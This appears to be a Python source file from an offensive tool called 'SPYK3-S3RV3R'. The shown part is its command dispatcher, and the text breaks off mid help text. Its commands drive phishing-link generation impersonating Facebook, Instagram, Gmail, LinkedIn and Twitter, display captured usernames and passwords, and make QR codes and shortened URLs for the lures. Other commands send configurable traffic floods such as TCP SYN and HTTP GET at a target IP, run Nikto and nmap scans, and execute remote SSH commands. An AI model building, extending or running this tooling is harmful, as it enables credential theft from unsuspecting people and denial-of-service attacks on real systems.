    """Handle all 2000+ commands"""
    
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 nikto_scanner: NiktoScanner = None,
                 traffic_generator: TrafficGeneratorEngine = None,
                 ip_engine: IPAnalysisEngine = None):
        self.db = db
        self.ssh = ssh_manager
        self.nikto = nikto_scanner
        self.traffic_gen = traffic_generator
        self.ip_engine = ip_engine
        self.time_manager = TimeManager(db)
        self.social_tools = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self) -> Dict[str, callable]:
        return {
            # IP Analysis Commands
            'analyze': self._execute_analyze_ip,
            'stats': self._execute_stats,
            'report': self._execute_report_ip,
            
            # Time and Date Commands
            'time': self._execute_time,
            'date': self._execute_date,
            'datetime': self._execute_datetime,
            'now': self._execute_datetime,
            'history': self._execute_history,
            'time_history': self._execute_time_history,
            'timezone': self._execute_timezone,
            'time_diff': self._execute_time_diff,
            'date_diff': self._execute_date_diff,
            'time_add': self._execute_time_add,
            'date_add': self._execute_date_add,
            
            # SSH Commands
            'ssh_add': self._execute_ssh_add,
            'ssh_list': self._execute_ssh_list,
            'ssh_connect': self._execute_ssh_connect,
            'ssh_exec': self._execute_ssh_exec,
            'ssh_upload': self._execute_ssh_upload,
            'ssh_download': self._execute_ssh_download,
            'ssh_disconnect': self._execute_ssh_disconnect,
            'ssh_status': self._execute_ssh_status,
            
            # Traffic Generation Commands
            'generate_traffic': self._execute_generate_traffic,
            'traffic': self._execute_generate_traffic,
            'gen_traffic': self._execute_generate_traffic,
            'traffic_types': self._execute_traffic_types,
            'traffic_status': self._execute_traffic_status,
            'traffic_stop': self._execute_traffic_stop,
            'traffic_logs': self._execute_traffic_logs,
            'traffic_help': self._execute_traffic_help,
            
            # Nikto Commands
            'nikto': self._execute_nikto,
            'nikto_full': self._execute_nikto_full,
            'nikto_ssl': self._execute_nikto_ssl,
            'nikto_sql': self._execute_nikto_sql,
            'nikto_xss': self._execute_nikto_xss,
            'nikto_cgi': self._execute_nikto_cgi,
            'nikto_status': self._execute_nikto_status,
            'nikto_results': self._execute_nikto_results,
            
            # Social Engineering Commands
            'generate_phishing_link_for_facebook': self._execute_phishing_facebook,
            'generate_phishing_link_for_instagram': self._execute_phishing_instagram,
            'generate_phishing_link_for_twitter': self._execute_phishing_twitter,
            'generate_phishing_link_for_gmail': self._execute_phishing_gmail,
            'generate_phishing_link_for_linkedin': self._execute_phishing_linkedin,
            'generate_phishing_link_for_custom': self._execute_phishing_custom,
            'phishing_links': self._execute_phishing_links,
            'phishing_credentials': self._execute_phishing_credentials,
            'phishing_qr': self._execute_phishing_qr,
            'phishing_shorten': self._execute_phishing_shorten,
            
            # IP Management
            'add_ip': self._execute_add_ip,
            'remove_ip': self._execute_remove_ip,
            'block_ip': self._execute_block_ip,
            'unblock_ip': self._execute_unblock_ip,
            'list_ips': self._execute_list_ips,
            'ip_info': self._execute_ip_info,
            
            # Ping and Scan Commands
            'ping': self._execute_ping,
            'scan': self._execute_scan,
            'quick_scan': self._execute_quick_scan,
            'nmap': self._execute_nmap,
            'portscan': self._execute_scan,
            'full_scan': self._execute_full_scan,
            'web_scan': self._execute_web_scan,
            
            # Traceroute
            'traceroute': self._execute_traceroute,
            'tracert': self._execute_traceroute,
            
            # Info commands
            'whois': self._execute_whois,
            'dig': self._execute_dig,
            'dns': self._execute_dig,
            'location': self._execute_location,
            
            # System commands
            'system': self._execute_system,
            'status': self._execute_status,
            'threats': self._execute_threats,
            
            # Help
            'help': self._execute_help
        }
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command and return results"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return self._create_result(False, "Empty command")
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        try:
            if cmd_name in self.command_map:
                result = self.command_map[cmd_name](args)
            else:
                result = self._create_result(False, f"Unknown command: {cmd_name}")
            
            execution_time = time.time() - start_time
            
            self.db.log_command(
                command=command,
                source=source,
                success=result.get('success', False),
                output=result.get('output', '')[:5000],
                execution_time=execution_time
            )
            
            if cmd_name in ['time', 'date', 'datetime', 'now']:
                self.db.log_time_command(
                    command=cmd_name,
                    user=source,
                    result=str(result.get('output', ''))[:100]
                )
            
            result['execution_time'] = execution_time
            return result
        
        except Exception as e:
            execution_time = time.time() - start_time
            error_msg = f"Error executing command: {e}"
            
            self.db.log_command(
                command=command,
                source=source,
                success=False,
                output=error_msg,
                execution_time=execution_time
            )
            
            return self._create_result(False, error_msg, execution_time)
    
    def _create_result(self, success: bool, data: Any, execution_time: float = 0.0) -> Dict[str, Any]:
        if isinstance(data, str):
            return {'success': success, 'output': data, 'execution_time': execution_time}
        else:
            return {'success': success, 'data': data, 'execution_time': execution_time}
    
    # ==================== IP Analysis Command Handlers ====================
    def _execute_analyze_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: analyze <ip>")
        target = args[0]
        
        if not self.ip_engine:
            return self._create_result(False, "IP Analysis engine not initialized")
        
        result, reports = self.ip_engine.analyze_ip(target, generate_report=True, report_format="both")
        
        if result.success:
            output = f"✅ IP Analysis completed for {target}\n"
            output += f"Risk Level: {result.security_status.get('risk_level', 'unknown').upper()}\n"
            output += f"Risk Score: {result.security_status.get('risk_score', 0)}\n"
            output += f"Open Ports: {len(result.port_scan_result.get('open_ports', []))}\n"
            output += f"Location: {result.geolocation_result.get('country', 'Unknown')}\n"
            
            if reports:
                output += f"\nReports generated:\n"
                for fmt, path in reports.items():
                    output += f"  • {fmt.upper()}: {path}\n"
            
            return self._create_result(True, output)
        else:
            return self._create_result(False, f"Analysis failed: {result.error}")
    
    def _execute_stats(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: stats <ip>")
        target = args[0]
        
        if not self.ip_engine:
            return self._create_result(False, "IP Analysis engine not initialized")
        
        graphics_files = self.ip_engine.generate_security_statistics(target)
        
        if graphics_files:
            output = f"Statistics generated for {target}:\n"
            for graphic_type, graphic_path in graphics_files.items():
                output += f"  • {graphic_type}: {graphic_path}\n"
            return self._create_result(True, output)
        else:
            return self._create_result(False, f"No statistics found for IP: {target}")
    
    def _execute_report_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: report <ip>")
        target = args[0]
        
        analyses = self.db.get_analysis_by_ip(target)
        if not analyses:
            return self._create_result(False, f"No reports found for IP: {target}")
        
        latest = analyses[0]
        if latest.get('report_path') and os.path.exists(latest['report_path']):
            return self._create_result(True, f"Report: {latest['report_path']}")
        else:
            return self._create_result(False, f"No report file found for IP: {target}")
    
    # ==================== Time Command Handlers ====================
    def _execute_time(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        result = self.time_manager.get_current_time(full)
        return self._create_result(True, result)
    
    def _execute_date(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        result = self.time_manager.get_current_date(full)
        return self._create_result(True, result)
    
    def _execute_datetime(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        result = self.time_manager.get_datetime(full)
        return self._create_result(True, result)
    
    def _execute_timezone(self, args: List[str]) -> Dict[str, Any]:
        result = self.time_manager.get_timezone_info()
        return self._create_result(True, result)
    
    def _execute_time_diff(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: time_diff <time1> <time2> (HH:MM:SS)")
        result = self.time_manager.get_time_difference(args[0], args[1])
        return self._create_result(True, result)
    
    def _execute_date_diff(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: date_diff <date1> <date2> (YYYY-MM-DD)")
        result = self.time_manager.get_date_difference(args[0], args[1])
        return self._create_result(True, result)
    
    def _execute_time_add(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: time_add <time> [seconds] [minutes] [hours] [days]")
        time_str = args[0]
        seconds = int(args[1]) if len(args) > 1 else 0
        minutes = int(args[2]) if len(args) > 2 else 0
        hours = int(args[3]) if len(args) > 3 else 0
        days = int(args[4]) if len(args) > 4 else 0
        result = self.time_manager.add_time(time_str, seconds, minutes, hours, days)
        return self._create_result(True, result)
    
    def _execute_date_add(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: date_add <date> [days] [weeks] [months] [years]")
        date_str = args[0]
        days = int(args[1]) if len(args) > 1 else 0
        weeks = int(args[2]) if len(args) > 2 else 0
        months = int(args[3]) if len(args) > 3 else 0
        years = int(args[4]) if len(args) > 4 else 0
        result = self.time_manager.add_date(date_str, days, weeks, months, years)
        return self._create_result(True, result)
    
    def _execute_history(self, args: List[str]) -> Dict[str, Any]:
        limit = 20
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        history = self.db.get_command_history(limit)
        if not history:
            return self._create_result(True, "📜 No command history found.")
        output = f"📜 Command History (Last {len(history)}):\n"
        output += "─" * 50 + "\n"
        for i, cmd in enumerate(history, 1):
            status = "✅" if cmd['success'] else "❌"
            output += f"{i:2d}. {status} [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
        return self._create_result(True, output)
    
    def _execute_time_history(self, args: List[str]) -> Dict[str, Any]:
        limit = 20
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        history = self.db.get_time_history(limit)
        if not history:
            return self._create_result(True, "⏰ No time/date command history found.")
        output = f"⏰ Time/Date Command History (Last {len(history)}):\n"
        output += "─" * 50 + "\n"
        for i, cmd in enumerate(history, 1):
            output += f"{i:2d}. [{cmd['timestamp'][:19]}] {cmd['command']}\n"
            if cmd['result']:
                output += f"     → {cmd['result'][:50]}\n"
        return self._create_result(True, output)
    
    # ==================== SSH Command Handlers ====================
    def _execute_ssh_add(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if len(args) < 3:
            return self._create_result(False, "Usage: ssh_add <name> <host> <username> [password] [port] [notes]")
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        port = int(args[4]) if len(args) > 4 and args[4].isdigit() else 22
        notes = ' '.join(args[5:]) if len(args) > 5 else ""
        key_file = None
        if password and (password.endswith('.pem') or password.endswith('.key')):
            key_file = password
            password = None
        result = self.ssh.add_server(name, host, username, password, key_file, port, notes)
        return self._create_result(result['success'], result)
    
    def _execute_ssh_list(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        servers = self.ssh.get_servers()
        status = self.ssh.get_status()
        output = f"SSH Servers ({len(servers)}):\n\n"
        for server in servers:
            connected = "✅" if server['connected'] else "❌"
            output += f"{connected} {server['id']} - {server['name']} ({server['host']}:{server['port']})\n"
        output += f"\nActive Connections: {status.get('total_connections', 0)}"
        return self._create_result(True, output)
    
    def _execute_ssh_connect(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if not args:
            return self._create_result(False, "Usage: ssh_connect <server_id>")
        result = self.ssh.connect(args[0])
        return self._create_result(result['success'], result)
    
    def _execute_ssh_exec(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if len(args) < 2:
            return self._create_result(False, "Usage: ssh_exec <server_id> <command>")
        server_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(server_id, command, executed_by="cli")
        if result.success:
            return self._create_result(True, result.output)
        else:
            return self._create_result(False, result.error or "Command execution failed")
    
    def _execute_ssh_upload(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if len(args) < 3:
            return self._create_result(False, "Usage: ssh_upload <server_id> <local_path> <remote_path>")
        server_id = args[0]
        local_path = args[1]
        remote_path = args[2]
        if not os.path.exists(local_path):
            return self._create_result(False, f"Local file not found: {local_path}")
        result = self.ssh.upload_file(server_id, local_path, remote_path)
        return self._create_result(result['success'], result)
    
    def _execute_ssh_download(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if len(args) < 3:
            return self._create_result(False, "Usage: ssh_download <server_id> <remote_path> <local_path>")
        server_id = args[0]
        remote_path = args[1]
        local_path = args[2]
        os.makedirs(os.path.dirname(os.path.abspath(local_path)), exist_ok=True)
        result = self.ssh.download_file(server_id, remote_path, local_path)
        return self._create_result(result['success'], result)
    
    def _execute_ssh_disconnect(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        server_id = args[0] if args else None
        self.ssh.disconnect(server_id)
        return self._create_result(True, f"Disconnected from server {server_id}" if server_id else "Disconnected from all servers")
    
    def _execute_ssh_status(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        server_id = args[0] if args else None
        status = self.ssh.get_status(server_id)
        return self._create_result(True, status)
    
    # ==================== Traffic Generation Command Handlers ====================
    def _execute_generate_traffic(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        if len(args) < 3:
            return self._create_result(False, "Usage: generate_traffic <type> <ip> <duration> [port] [rate]")
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except ValueError:
            return self._create_result(False, f"Invalid duration: {args[2]}")
        port = None
        if len(args) >= 4:
            try:
                port = int(args[3])
            except ValueError:
                return self._create_result(False, f"Invalid port: {args[3]}")
        rate = 100
        if len(args) >= 5:
            try:
                rate = int(args[4])
            except ValueError:
                return self._create_result(False, f"Invalid rate: {args[4]}")
        
        available_types = self.traffic_gen.get_available_traffic_types()
        if traffic_type not in available_types:
            return self._create_result(False, f"Invalid traffic type. Available: {', '.join(available_types)}")
        
        try:
            generator = self.traffic_gen.generate_traffic(
                traffic_type=traffic_type,
                target_ip=target_ip,
                duration=duration,
                port=port,
                packet_rate=rate,
                executed_by="cli"
            )
            return self._create_result(True, {
                'message': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration} seconds",
                'traffic_type': generator.traffic_type,
                'target_ip': generator.target_ip,
                'duration': generator.duration
            })
        except Exception as e:
            return self._create_result(False, f"Traffic generation failed: {e}")
    
    def _execute_traffic_types(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        help_text = self.traffic_gen.get_traffic_types_help()
        return self._create_result(True, help_text)
    
    def _execute_traffic_status(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        active = self.traffic_gen.get_active_generators()
        output = f"Active Traffic Generators: {len(active)}\n\n"
        for gen in active:
            output += f"  • {gen['target_ip']} - {gen['traffic_type']} ({gen['packets_sent']} packets)\n"
        return self._create_result(True, output)
    
    def _execute_traffic_stop(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        if args:
            generator_id = args[0]
            if self.traffic_gen.stop_generation(generator_id):
                return self._create_result(True, f"Stopped traffic generator {generator_id}")
            else:
                return self._create_result(False, f"Generator {generator_id} not found")
        else:
            self.traffic_gen.stop_generation()
            return self._create_result(True, "Stopped all traffic generators")
    
    def _execute_traffic_logs(self, args: List[str]) -> Dict[str, Any]:
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        logs = self.db.get_traffic_logs(limit)
        output = f"Traffic Logs (Last {len(logs)}):\n\n"
        for log in logs:
            status = "✅" if log.get('status') == 'completed' else "❌"
            output += f"{status} {log.get('target_ip')} - {log.get('traffic_type')} ({log.get('packets_sent')} packets)\n"
        return self._create_result(True, output)
    
    def _execute_traffic_help(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        help_text = self.traffic_gen.get_traffic_types_help()
        examples = "\nExamples:\n  generate_traffic icmp 192.168.1.1 10\n  generate_traffic tcp_syn 192.168.1.1 30 80\n  generate_traffic http_get 192.168.1.1 60 80 200\n"
        return self._create_result(True, help_text + examples)
    
    # ==================== Nikto Command Handlers ====================
    def _execute_nikto(self, args: List[str]) -> Dict[str, Any]:
        if not self.nikto:
            return self._create_result(False, "Nikto scanner not initialized")
        if not args:
            return self._create_result(False, "Usage: nikto <target>")
        target = args[0]
        result = self.nikto.scan(target)
        if result.success:
            output = f"Nikto scan completed for {target}\n"
            output += f"Vulnerabilities found: {len(result.vulnerabilities)}\n"
            output += f"Scan time: {result.scan_time:.2f}s\n"
            output += f"Output file: {result.output_file}\n\n"
            for vuln in result.vulnerabilities[:10]:
                output += f"  • {vuln.get('description', '')[:100]}\n"
            return self._create_result(True, output)
        else:
            return self._create_result(False, f"Nikto scan failed: {result.error}")
    
    def _execute_nikto_full(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_full <target>")
        target = args[0]
        options = {'tuning': '123456789', 'level': 3, 'timeout': 600}
        result = self.nikto.scan(target, options)
        return self._create_result(result.success, result)
    
    def _execute_nikto_ssl(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_ssl <target>")
        target = args[0]
        options = {'ssl': True, 'tuning': '6'}
        result = self.nikto.scan(target, options)
        return self._create_result(result.success, result)
    
    def _execute_nikto_sql(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_sql <target>")
        target = args[0]
        options = {'tuning': '4'}
        result = self.nikto.scan(target, options)
        return self._create_result(result.success, result)
    
    def _execute_nikto_xss(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_xss <target>")
        target = args[0]
        options = {'tuning': '5'}
        result = self.nikto.scan(target, options)
        return self._create_result(result.success, result)
    
    def _execute_nikto_cgi(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_cgi <target>")
        target = args[0]
        options = {'tuning': '2'}
        result = self.nikto.scan(target, options)
        return self._create_result(result.success, result)
    
    def _execute_nikto_status(self, args: List[str]) -> Dict[str, Any]:
        if not self.nikto:
            return self._create_result(False, "Nikto scanner not initialized")
        status = {
            'available': self.nikto.nikto_available,
            'scan_types': self.nikto.get_available_scan_types()
        }
        return self._create_result(True, status)
    
    def _execute_nikto_results(self, args: List[str]) -> Dict[str, Any]:
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        scans = self.db.get_nikto_scans(limit)
        output = f"Recent Nikto Scans ({len(scans)}):\n\n"
        for scan in scans:
            success = "✅" if scan.get('success') else "❌"
            output += f"{success} {scan.get('target')} - {scan.get('timestamp')[:19]}\n"
        return self._create_result(True, output)
    
    # ==================== IP Management Command Handlers ====================
    def _execute_add_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: add_ip <ip> [notes]")
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else "Added via command"
        try:
            ipaddress.ip_address(ip)
            success = self.db.add_managed_ip(ip, "cli", notes)
            return self._create_result(success, f"✅ IP {ip} added to monitoring" if success else f"Failed to add IP {ip}")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_remove_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: remove_ip <ip>")
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            success = self.db.remove_managed_ip(ip)
            return self._create_result(success, f"✅ IP {ip} removed from monitoring" if success else f"IP {ip} not found")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_block_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: block_ip <ip> [reason]")
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else "Manually blocked"
        try:
            ipaddress.ip_address(ip)
            firewall_success = NetworkTools.block_ip_firewall(ip)
            db_success = self.db.block_ip(ip, reason, "cli")
            if firewall_success or db_success:
                return self._create_result(True, f"✅ IP {ip} blocked successfully")
            else:
                return self._create_result(False, f"Failed to block IP {ip}")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_unblock_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: unblock_ip <ip>")
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            firewall_success = NetworkTools.unblock_ip_firewall(ip)
            db_success = self.db.unblock_ip(ip, "cli")
            if firewall_success or db_success:
                return self._create_result(True, f"✅ IP {ip} unblocked successfully")
            else:
                return self._create_result(False, f"Failed to unblock IP {ip}")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_list_ips(self, args: List[str]) -> Dict[str, Any]:
        include_blocked = True
        if args and args[0].lower() == 'active':
            include_blocked = False
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return self._create_result(True, "No managed IPs found")
        output = f"Managed IPs ({len(ips)}):\n\n"
        for ip in ips:
            blocked = "🔒" if ip.get('is_blocked') else "✓"
            output += f"{blocked} {ip['ip_address']} - {ip.get('notes', '')[:30]}\n"
        return self._create_result(True, output)
    
    def _execute_ip_info(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ip_info <ip>")
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.get_ip_info(ip)
            location = NetworkTools.get_ip_location(ip)
            threats = self.db.get_threats_by_ip(ip, 5)
            output = f"IP Information: {ip}\n\n"
            if db_info:
                output += f"Added: {db_info.get('added_date', 'Unknown')}\n"
                output += f"Blocked: {'Yes' if db_info.get('is_blocked') else 'No'}\n"
                if db_info.get('block_reason'):
                    output += f"Block Reason: {db_info['block_reason']}\n"
                output += f"Alert Count: {db_info.get('alert_count', 0)}\n"
            if location.get('success'):
                output += f"\nLocation:\n"
                output += f"  Country: {location.get('country')}\n"
                output += f"  City: {location.get('city')}\n"
                output += f"  ISP: {location.get('isp')}\n"
            if threats:
                output += f"\nRecent Threats ({len(threats)}):\n"
                for threat in threats[:3]:
                    output += f"  • {threat.get('threat_type')} ({threat.get('severity')})\n"
            return self._create_result(True, output)
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    # ==================== Social Engineering Command Handlers ====================
    def _execute_phishing_facebook(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("facebook")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_instagram(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("instagram")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_twitter(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("twitter")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_gmail(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("gmail")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_linkedin(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("linkedin")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_custom(self, args: List[str]) -> Dict[str, Any]:
        custom_url = args[0] if args else None
        result = self.social_tools.generate_phishing_link("custom", custom_url)
        return self._create_result(result['success'], result)
    
    def _execute_phishing_links(self, args: List[str]) -> Dict[str, Any]:
        links = self.social_tools.get_active_links()
        all_links = self.db.get_phishing_links()
        output = f"Phishing Links:\n\n"
        output += f"Active Links ({len(links)}):\n"
        for link in links:
            output += f"  • {link['link_id']} - {link['platform']}\n"
        output += f"\nTotal Links in Database: {len(all_links)}"
        return self._create_result(True, output)
    
    def _execute_phishing_credentials(self, args: List[str]) -> Dict[str, Any]:
        link_id = args[0] if args else None
        credentials = self.social_tools.get_captured_credentials(link_id)
        if not credentials:
            return self._create_result(True, "No captured credentials found")
        output = f"Captured Credentials ({len(credentials)}):\n\n"
        for cred in credentials[:10]:
            output += f"  • {cred.get('timestamp')[:19]} - {cred.get('username')} / {cred.get('password')}\n"
        return self._create_result(True, output)
    
    def _execute_phishing_qr(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: phishing_qr <link_id>")
        link_id = args[0]
        qr_path = self.social_tools.generate_qr_code(link_id)
        if qr_path:
            return self._create_result(True, f"QR code generated: {qr_path}")
        else:
            return self._create_result(False, f"Failed to generate QR code")
    
    def _execute_phishing_shorten(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: phishing_shorten <link_id>")
        link_id = args[0]
        short_url = self.social_tools.shorten_url(link_id)
        if short_url:
            return self._create_result(True, f"Shortened URL: {short_url}")
        else:
            return self._create_result(False, f"Failed to shorten URL")
    
    # ==================== Ping and Scan Command Handlers ====================
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ping <target>")
        target = args[0]
        result = self.tools.ping(target)
        return self._create_result(result.success, result.output)
    
    def _execute_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: scan <target> [ports]")
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.tools.nmap_scan(target, "quick", ports)
        return self._create_result(result.success, result.output)
    
    def _execute_quick_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: quick_scan <target>")
        target = args[0]
        result = self.tools.nmap_scan(target, "quick_scan")
        return self._create_result(result.success, result.output)
    
    def _execute_nmap(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nmap <target> [options]")
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ""
        result = self.tools.nmap_scan(target, "custom", options)
        return self._create_result(result.success, result.output)
    
    def _execute_full_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: full_scan <target>")
        target = args[0]
        result = self.tools.nmap_scan(target, "full")
        return self._create_result(result.success, result.output)
    
    def _execute_web_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: web_scan <target>")
        target = args[0]
        result = self.tools.nmap_scan(target, "web")
        return self._create_result(result.success, result.output)
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: traceroute <target>")
        target = args[0]
        result = self.tools.traceroute(target)
        return self._create_result(result.success, result.output)
    
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: whois <domain>")
        target = args[0]
        result = self.tools.whois_lookup(target)
        return self._create_result(result.success, result.output)
    
    def _execute_dig(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: dig <domain>")
        target = args[0]
        result = self.tools.dns_lookup(target)
        return self._create_result(result.success, result.output)
    
    def _execute_location(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: location <ip>")
        target = args[0]
        result = self.tools.get_ip_location(target)
        return self._create_result(result['success'], result)
    
    def _execute_system(self, args: List[str]) -> Dict[str, Any]:
        info = {
            'system': platform.system(),
            'release': platform.release(),
            'hostname': socket.gethostname(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory_percent': psutil.virtual_memory().percent,
            'disk_percent': psutil.disk_usage('/').percent
        }
        return self._create_result(True, info)
    
    def _execute_status(self, args: List[str]) -> Dict[str, Any]:
        stats = self.db.get_statistics()
        status = {
            'timestamp': datetime.datetime.now().isoformat(),
            'statistics': stats,
            'cpu': f"{psutil.cpu_percent(interval=1)}%",
            'memory': f"{psutil.virtual_memory().percent}%",
            'disk': f"{psutil.disk_usage('/').percent}%"
        }
        return self._create_result(True, status)
    
    def _execute_threats(self, args: List[str]) -> Dict[str, Any]:
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        threats = self.db.get_recent_threats(limit)
        return self._create_result(True, threats)
    
    def _execute_help(self, args: List[str]) -> Dict[str, Any]:
        help_text = """
🕷️ SPYK3-S3RV3R v1.0.0 Commands 🕷️

**🔍 IP ANALYSIS:**
`analyze <ip>` - Complete IP analysis with report generation
`stats <ip>` - Generate statistical graphics for IP
`report <ip>` - Get latest analysis report

**🔌 SSH COMMANDS:**
`ssh_add <name> <host> <user> [password] [port]` - Add SSH server
`ssh_list` - List configured SSH servers
`ssh_connect <server_id>` - Connect to SSH server
`ssh_exec <server_id> <command>` - Execute command on remote server
`ssh_upload <server_id> <local> <remote>` - Upload file
`ssh_download <server_id> <remote> <local>` - Download file
`ssh_disconnect <server_id>` - Disconnect from server

**⏰ TIME & DATE COMMANDS:**
`time` - Show current time
`date` - Show current date
`datetime` - Show both date and time
`history [limit]` - View command history
`time_history` - View time command history
`timezone` - Show timezone information
`time_diff <t1> <t2>` - Calculate time difference
`date_diff <d1> <d2>` - Calculate date difference

**🚀 TRAFFIC GENERATION:**
`generate_traffic <type> <ip> <duration> [port] [rate]` - Generate real traffic
`traffic_types` - List available traffic types
`traffic_status` - Check active generators
`traffic_stop [id]` - Stop traffic generation
`traffic_logs [limit]` - View traffic logs

**🕷️ NIKTO WEB SCANNER:**
`nikto <target>` - Basic web vulnerability scan
`nikto_full <target>` - Full scan with all tests
`nikto_ssl <target>` - SSL/TLS specific scan
`nikto_sql <target>` - SQL injection scan
`nikto_xss <target>` - XSS scan
`nikto_cgi <target>` - CGI scan
`nikto_status` - Check scanner status
`nikto_results` - View recent scans

**🎣 SOCIAL ENGINEERING:**
`generate_phishing_link_for_facebook` - Facebook phishing link
`generate_phishing_link_for_instagram` - Instagram phishing link
`generate_phishing_link_for_twitter` - Twitter phishing link
